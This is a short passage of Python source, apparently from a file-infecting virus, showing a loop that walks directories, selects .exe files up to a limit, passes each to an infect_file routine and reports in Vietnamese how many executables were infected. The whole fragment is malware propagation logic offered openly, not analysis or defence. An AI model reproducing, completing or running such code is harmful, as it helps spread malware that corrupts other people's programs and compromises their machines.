                      for f in fn:
                          if len(done) >= limit: break
                          if not f.lower().endswith(".exe"): continue
                          fp = os.path.join(dp, f)
                          if infect_file(fp): done.append(fp)
              _stat["file"] += len(done); _log(f"infect: {len(done)}")
              if not done: return "Khong nhiem duoc file nao"
              return f"Da nhiem {len(done)} file .exe:\n" + "\n".join(done[:20])

